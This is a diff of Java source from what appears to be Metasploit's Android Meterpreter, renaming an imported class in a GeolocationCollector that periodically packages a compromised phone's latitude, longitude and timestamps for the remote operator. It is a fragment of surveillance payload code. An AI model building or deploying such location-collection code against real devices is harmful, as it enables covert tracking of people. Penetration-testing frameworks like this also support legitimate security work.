@@ -4,7 +4,7 @@ import android.content.Context;
 import android.location.Location;
 import android.location.LocationManager;
 
-import com.metasploit.meterpreter.android.interval_collect;
+import com.metasploit.meterpreter.android.android_interval_collect;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
@@ -124,13 +124,13 @@ public class GeolocationCollector extends IntervalCollector  {
                 TLVPacket resultSet = new TLVPacket();
                 TLVPacket geolocationSet = new TLVPacket();
 
-                resultSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_TIMESTAMP, timestamp / 1000);
+                resultSet.add(android_interval_collect.TLV_TYPE_COLLECT_RESULT_TIMESTAMP, timestamp / 1000);
 
-                geolocationSet.add(interval_collect.TLV_TYPE_GEO_LAT, Double.toString(geoLoc.mLatitude));
-                geolocationSet.add(interval_collect.TLV_TYPE_GEO_LONG, Double.toString(geoLoc.mLongitude));
-                resultSet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GEO, geolocationSet);
+                geolocationSet.add(android_interval_collect.TLV_TYPE_GEO_LAT, Double.toString(geoLoc.mLatitude));
+                geolocationSet.add(android_interval_collect.TLV_TYPE_GEO_LONG, Double.toString(geoLoc.mLongitude));
+                resultSet.addOverflow(android_interval_collect.TLV_TYPE_COLLECT_RESULT_GEO, geolocationSet);
 
-                packet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GROUP, resultSet);
+                packet.addOverflow(android_interval_collect.TLV_TYPE_COLLECT_RESULT_GROUP, resultSet);
             }
         }
         catch (IOException ex) {
